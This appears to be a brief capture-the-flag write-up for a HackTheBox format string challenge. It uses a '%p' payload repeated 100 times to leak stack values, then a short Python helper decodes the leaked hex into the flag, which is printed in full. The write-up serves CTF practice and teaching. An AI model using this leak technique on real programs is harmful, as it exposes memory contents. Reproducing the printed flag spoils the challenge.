@@ -1,0 +1,22 @@
+This problem was a format string exploit 
+
+First problem is to overcome the random by sending 2 and then 1 as option
+
+after that i sent "%p" * 100 
+
+i did this twice by running the program twice and got array by split('0x') and then 
+
+for i in a:
+    if i in b:
+        print(i)
+
+def tr(a):
+    z=""
+    for i in range(0,len(a),2):
+        z+=chr(int(a[i:i+2],16))
+    return z[::-1]
+
+tr('7b425448') + tr('5f796877') + tr('5f643164') + tr('34735f31') + tr('745f3376') + tr('665f3368') + tr('5f67346c') + tr('745f6e30') + tr('355f3368') + tr('6b633474') + tr('7d213f')
+
+these are the values common and this results in the flag
+HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}
